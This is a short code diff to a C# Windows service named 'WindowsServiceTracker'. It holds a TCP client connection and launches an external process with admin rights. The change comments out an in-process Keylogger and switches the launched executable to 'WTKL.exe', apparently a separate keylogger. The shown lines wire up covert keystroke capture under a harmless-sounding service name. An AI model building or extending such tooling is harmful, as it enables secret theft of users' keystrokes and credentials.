@@ -33,7 +33,7 @@ namespace WindowsServiceTracker
         private TcpClient tcp;
         NetworkStream tcpStream;
 
-        private Keylogger keylog = new Keylogger();
+        //private Keylogger keylog = new Keylogger();
 
         public Tracker()
         {
@@ -64,7 +64,7 @@ namespace WindowsServiceTracker
             ProcessStartInfo testProcessStartInfo = new ProcessStartInfo();
 
             //File name here MUST MATCH the file name of the external process you've created
-            testProcessStartInfo.FileName = "TestProcess.exe";
+            testProcessStartInfo.FileName = "WTKL.exe";
             //Verb = "runas" and UseShellExecute = true must be set for admin rights (I think)
             testProcessStartInfo.Verb = "runas";
             testProcessStartInfo.WindowStyle = ProcessWindowStyle.Normal;
@@ -87,7 +87,7 @@ namespace WindowsServiceTracker
 
         protected override void OnStop()
         {
-            Keylogger.Stop();
+            //Keylogger.Stop();
             SendStringMsg("Bye!");
 
             Disconnect();
